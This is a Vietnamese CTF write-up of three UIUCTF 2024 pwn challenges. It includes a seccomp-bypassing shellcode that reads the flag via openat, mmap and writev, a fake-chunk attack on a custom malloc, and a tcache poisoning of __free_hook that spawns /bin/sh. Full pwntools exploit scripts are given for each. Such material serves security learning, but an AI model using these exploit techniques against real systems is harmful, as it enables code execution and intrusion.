---
title: "UIUCTF 2024: PWNABLE WRITE UP"
author: kur0
pubDatetime: 2024-07-03T05:17:19Z
slug: the-title-of-the-post
featured: true
draft: false
tags:
  - wu
  - CTF
ogImage: ""
description: Some note for UIUCTF2024
canonicalURL: https://example.org/my-article-was-already-posted-here
---
## Table of contents
## SYSCALLS
Đây là một bài shellcode bypass seccomp. Chương trình sẽ đọc và thực thi shellcode mình truyền vào cùng với một số seccomp như sau:
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x06 0x00 0x00 0x00000000  return KILL
 ```
 Có thể thấy seccomp đã chặn các syscall thường dùng để pop shell như `execve` và `execveat`, hầu như các syscalls liên quan tới `open, read, write` cũng bị chặn
 Sau khi check và thử thì mình thấy còn lại một số syscall hữu dụng:
- `openat` để mở file 
- `mmap` có thể dùng để đọc dữ liệu từ fd
- `writev` ở trên seccomp không chặn hẳn mà thêm một số điều kiện như 
`(fd >> 32) > 0 || fd < 0x3e8`

Từ ba syscall trên ta có thể build được một shellcode open read write để đọc flag (Challenge đã cho ta biết file flag nằm cùng thư mục với file challnge)

**Script của mình:**
```python
from pwn import *
import os

del os.environ['WT_SESSION']
context.log_level = 'debug'
context.binary = exe = ELF('./syscalls')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

gs = '''
     b *setvbuf
     c
     del 1
     '''

match sys.argv[1]:
    case "run":
        p = process(exe.path)
    case "debug":
        p = gdb.debug(exe.path, gs)
    case "remote":
        p = remote('syscalls.chal.uiuc.tf', 1337, ssl=True)
    case default:
        p = "nothing"

def main():
    payload_1 = asm('''
                mov rbx, [rsp + 0x100]
                sub rbx, 0x29d90
                mov rax, 0x7478
                push rax
                mov rax, 0x742e67616c662f2e
                push rax
                mov rsi, rsp
                mov rdi, 0xffffffffffffff9c
                mov rdx, 0x0
                mov rax, 0x101
                syscall
                mov rdi, 0x0
                mov rsi, 0x40
                mov rdx, 0x1
                mov r8, rax
                mov r9, 0x0
                mov r10, 0x3
                mov rax, 0x9
                syscall
                mov rcx, 0x100
                push rcx
                push rax
                mov rdi, 0x100000001
                mov rsi, rsp
                mov rax, 0x14
                syscall
                ''')

    p.sendlineafter(b'you.\n', payload_1)

    p.interactive()

if __name__ == "__main__":
    main()
```

## PWNYMALLOC
Đây là một bài ret2win với malloc & free tự chế

Đầu tiên trong hàm main cho ta 4 option:
```c
    while (1) {
        puts("\n1. Submit a complaint");
        puts("2. View pending complaints");
        puts("3. Request a refund");
        puts("4. Check refund status");
        puts("5. Exit\n");
```
Ta sẽ xem qua từng option trên

**1 + 2. Submit a complaint & View pending complaints**
```c
void handle_complaint() {
    puts("Please enter your complaint:");
    char *trash = pwnymalloc(0x48);
    fgets(trash, 0x48, stdin);
    memset(trash, 0, 0x48);
    pwnyfree(trash);
    puts("Thank you for your feedback! We take all complaints very seriously.");
}

void handle_view_complaints() {
    puts("Oh no! Our complaint database is currently down. Please try again later.");
}
```
- Hàm malloc một chunk 0x48 và free nó ngay sau đó

**3. Request a refund**
```c
void handle_refund_request() {
    int request_id = -1;
    for (int i = 0; i < 10; i++) {
        if (requests[i] == NULL) {
            request_id = i;
            break;
        }
    }

    if (request_id == -1) {
        puts("Sorry, we are currently unable to process any more refund requests.");
    }

    refund_request_t *request = pwnymalloc(sizeof(refund_request_t));
    puts("Please enter the dollar amount you would like refunded:");
    char amount_str[0x10];
    fgets(amount_str, 0x10, stdin);
    sscanf(amount_str, "%d", &request->amount);

    puts("Please enter the reason for your refund request:");
    fgets(request->reason, 0x80, stdin);
    request->reason[0x7f] = '\0'; // null-terminate

    puts("Thank you for your request! We will process it shortly.");
    request->status = REFUND_DENIED;

    requests[request_id] = request;

    printf("Your request ID is: %d\n", request_id);
}
```
```c
typedef enum {
    REFUND_DENIED,
    REFUND_APPROVED,
} refund_status_t;

typedef struct refund_request {
    refund_status_t status;
    int amount;
    char reason[0x80];
} refund_request_t;

refund_request_t *requests[10] = {NULL};
```
- Trong hàm này ta sẽ có thể send `0x7f` bytes vào `request->reason` và terminate null bytes ở cuối
 
**4. Check refund status**
```c
void handle_refund_status() {
    puts("Please enter your request ID:");
    char id_str[0x10];
    fgets(id_str, 0x10, stdin);
    int request_id;
    sscanf(id_str, "%d", &request_id);

    if (request_id < 0 || request_id >= 10) {
        puts("Invalid request ID.");
        return;
    }

    refund_request_t *request = requests[request_id];
    if (request == NULL) {
        puts("Invalid request ID.");
        return;
    }

    if (request->status == REFUND_APPROVED) {
        puts("Your refund request has been approved!");
        puts("We don't actually have any money, so here's a flag instead:");
        print_flag();
    } else {
        puts("Your refund request has been denied.");
    }
}
```
- Hàm này sẽ check `request->status == REFUND_APPROVED` thì gọi hàm `print_flag`
- Ta thấy ở mọi request trước đó đều mặc định gán status là `REFUND_DENIED`, vậy mục tiêu sẽ là chỉnh status của request thành `REFUND_APPROVED` rồi gọi hàm này để lấy flag

**5. pwnymalloc**
```c
void *pwnymalloc(size_t size) {
    if (heap_start == NULL) {
        heap_start = sbrk(0);
        heap_end = heap_start;
    }

    if (size == 0) {
        return NULL;
    }

    size_t total_size = MAX(ALIGN(size + INUSE_META_SIZE), MIN_BLOCK_SIZE);

    chunk_ptr block = find_fit(total_size);

    if (block == NULL) {
        block = extend_heap(total_size);
        if (block == NULL) {
            return NULL;
        }
    } else if (get_size(block) >= total_size + MIN_BLOCK_SIZE) {
        split(block, total_size);
    }

    return (void *)((char *)block + INUSE_META_SIZE);
}
```
- Khi ta malloc một chunk mới hàm này sẽ tìm xem có chunk nào được free trước đó có size phù hợp không, nếu có sẽ lấy để phân vùng lại

**6. pwnyfree**
```c
void pwnyfree(void *ptr) {
    if (ptr == NULL) {
        return;
    }

    chunk_ptr block = (chunk_ptr)((char *)ptr - INUSE_META_SIZE);

    // Check alignment and status
    if ((size_t)block % ALIGNMENT != 0 || get_status(block) != INUSE) {
        return;
    }

    set_status(block, FREE);
    set_btag(block, get_size(block));

    block = coalesce(block);

    printf("Block size: %zu\n", get_size(block));

    free_list_insert(block);
}
```
- Ở hàm này sẽ check status bit và gọi `coalesce` để gom lại với các chunk đã được free trước đó rồi thêm vào free_list
- Bug của bài này nằm ở hàm `coalesce`
```c
static size_t get_prev_size(chunk_ptr block) {
    btag_t *prev_footer = (btag_t *)((char *)block - BTAG_SIZE);
    return prev_footer->size;
}

static chunk_ptr prev_chunk(chunk_ptr block) {
    if ((void *)block - get_prev_size(block) < heap_start || get_prev_size(block) == 0) {
        return NULL;
    }
    return (chunk_ptr)((char *)block - get_prev_size(block));
}

static chunk_ptr coalesce(chunk_ptr block) {
    chunk_ptr prev_block = prev_chunk(block);
    chunk_ptr next_block = next_chunk(block);
    size_t size = get_size(block);

    int prev_status = prev_block == NULL ? -1 : get_status(prev_block);
    int next_status = next_block == NULL ? -1 : get_status(next_block);

    if (prev_status == FREE && next_status == FREE) {
        free_list_remove(next_block);
        free_list_remove(prev_block);

        size += get_size(prev_block) + get_size(next_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    }
    if (prev_status == FREE) {
        free_list_remove(prev_block);

        size += get_size(prev_block);
        prev_block->size = pack_size(size, FREE);
        set_btag(prev_block, size);

        return prev_block;
    }
    if (next_status == FREE) {
        free_list_remove(next_block);

        size += get_size(next_block);
        block->size = pack_size(size, FREE);
        set_btag(block, size);

        return block;
    }

    return block;
}
```
- Có thể thấy `prev_chunk` tìm chunk đã free trước đó bằng cách lấy `block - prev_size` 
- `prev_size = (btag_t *)((char *)block - BTAG_SIZE)` mà không check thêm gì cả. Có nghĩa là nó sẽ lấy `prev_size` từ requset trước đó của mình nên mình có thể giả được một free chunk và tạo một cái request đè lên cái cũ ở lần request tới.
- Vậy ta chỉ cần set một fake size trước chunk bị free và tính toán sao cho:
    - `*(chunk - fake_size) != NULL` 
    - `*(chunk - fake_size + 0x8) == NULL && *(chunk - fake_size + 0x10) == NULL`

**Script của mình:**
```python
from pwn import *
import os

del os.environ['WT_SESSION']
context.log_level = 'debug'
context.binary = exe = ELF('./chal')

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

gs = '''
     b *handle_refund_status
     b *handle_complaint
     b *coalesce
     c
     '''

match sys.argv[1]:
    case "run":
        p = process(exe.path)
    case "debug":
        p = gdb.debug(exe.path, gs)
    case "remote":
        p = remote('pwnymalloc.chal.uiuc.tf', 1337, ssl=True)
    case default:
        p = "nothing"

def submit(data):
    p.sendlineafter(b'> ', b"1")
    p.sendlineafter(b'Please enter your complaint:\n', data)

def request(num, payload):
    p.sendlineafter(b'> ', b"3")
    p.sendlineafter(b'would like refunded:\n', str(num))
    p.sendafter(b'your refund request:\n', payload)

def check(id):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'your request ID:\n', str(id).encode())

def main():
    payload = 11 * p64(0xf0) + 4 * p64(0x0) + b'\xc0' + 6 * b'\x00' 
    request(1, payload)
    request(1, payload)
    submit(7 * p64(0x51))

    payload = 15 * p64(0x1) + 7 * b'\x00'
    request(1, payload)

    check(1)

    p.interactive()

if __name__ == "__main__":
    main()
```
## RUSTY POINTERS
Đây là một rust challenge sử dụng glibc 2.31. May mắn là chúng ta được cho cả file source.
```rust
fn menu() {
	println!("1. Create a Rule or Note");
	println!("2. Delete a Rule or Note");
	println!("3. Read a Rule or Note");
	println!("4. Edit a Rule or Note");
	println!("5. Make a Law");
	println!("6. Exit");
}

fn submenu(){
	println!("1. Rules");
	println!("2. Notes");
}
```
Chúng ta sẽ có 5 option của một bài heap là `create, delete, edit, read` và 2 option phụ.
Tuy không giỏi đọc rust lắm nhưng mà sau một hồi ngồi thử và debug thì mình thấy được rằng:
- Bài cho ta free libc ở option 5
- `Box` trong Rust là một kiểu dữ liệu động có thể allocate hoặc free 
- Sau khi thử một số option trong challenge thì mình nhận ra mình đã có một ptr trỏ vào 2 thằng mới được free như tcache vậy :Đ
- I try this:
```python
    create(rule)
    create(note)
    create(note)
    delete(note, 1)
    delete(note, 0)
    read(rule, 0)
```
- And see this one:
```c
Contents of Buffer: 
[160, 123, 23, 33, 126, 85, 0, 0, 16, 80, 23, 33, 126, 85, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
0x557e21177ba0, 0x557e21175010
```
- Vì đã có tcache và phiên bản libc này vẫn còn `hook` nên mình hướng tới việc ghi đè `__free_hook` thành `system` rồi sau đó free một chunk chứa `/bin/sh` để pop shell.

**Script của mình:**
```python
from pwn import *
import os

del os.environ['WT_SESSION']
context.log_level = 'debug'
context.binary = exe = ELF('./rusty_ptrs_patched')

libc = ELF('./libc.so.6')

match sys.argv[1]:
    case "run":
        p = process(exe.path)
    case "debug":
        p = gdb.debug(exe.path)
    case "remote":
        p = remote('rustyptrs.chal.uiuc.tf', 1337, ssl=True)
    case default:
        p = "nothing"

rule = 1
note = 2

def create(opt):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(opt).encode())

def delete(opt, id):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(opt).encode())
    p.sendlineafter(b'> ', str(id).encode())

def read(opt, id):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(opt).encode())
    p.sendlineafter(b'> ', str(id).encode())

def edit(opt, id, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', str(opt).encode())
    p.sendlineafter(b'> ', str(id).encode())
    p.sendlineafter(b'> ', data)

def leak():
    p.sendlineafter(b'> ', b'5')
    tmp = p.recvline()[0:14]
    return int(tmp, 16)

def main():
    libc_leak = leak()
    libc.address = libc_leak - 0x1ecbe0
    log.info("Libc base: " + hex(libc.address))

    create(rule)
    create(note)
    create(note)
    delete(note, 1)
    delete(note, 0)
    read(rule, 0)

    edit(rule, 0, p64(libc.sym['__free_hook']))
    create(note)
    create(note)
    
    edit(note, 1, p64(libc.sym['system']))
    edit(note, 0, b'/bin/sh\x00')

    delete(note, 0)

    p.interactive()

if __name__ == "__main__":
    main()
```
## BACKUP POWER
Updating...